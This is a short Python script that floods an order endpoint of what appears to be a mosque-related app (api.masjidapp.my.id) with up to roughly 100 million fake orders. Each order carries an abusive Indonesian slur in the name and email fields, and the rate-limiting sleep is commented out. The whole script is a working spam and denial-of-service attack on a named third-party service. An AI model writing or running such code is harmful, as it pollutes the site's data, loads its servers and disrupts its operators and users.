import random
import time
import requests
import datetime
import json

url = "https://api.masjidapp.my.id/order"

waktu = str(datetime.datetime.now())
i = 1
while (i<100000000):
    i = i+1
    try:
        obj = {
            'name' : str('JANGAN_SUKA_SPAM_KONTLO_'+str(i)+'@gmail.com'),
            'email' : str('KNTL_'+str(i)+'@gmail.com'),
            'phone' : str('1234567'+str(i)),
            'productid' : 6,
        }
        hasil = requests.post(url, data=obj)
        print("Respon " +str(hasil.status_code)+' ke  '+str(i) + " Pada : " + waktu)
    except KeyboardInterrupt:
        i=1000000000
    except:
        print("gagal post ke: " + str(i) + " Pada : " + waktu)
        
    # time.sleep(5)

# obj = {
#         'name' : str('JANGAN_SUKA_SPAM_KONTLO_'),
#         'email' : str('KNTL_@gmail.com'),
#         'phone' : str('1234567'),
#         'productid' : 6,
#     }
# hasil = requests.post(url, data=obj)
# print(hasil.status_code)
# # print("Respon " +hasil.text+' ke  '+str(i) + " Pada : " + waktu)
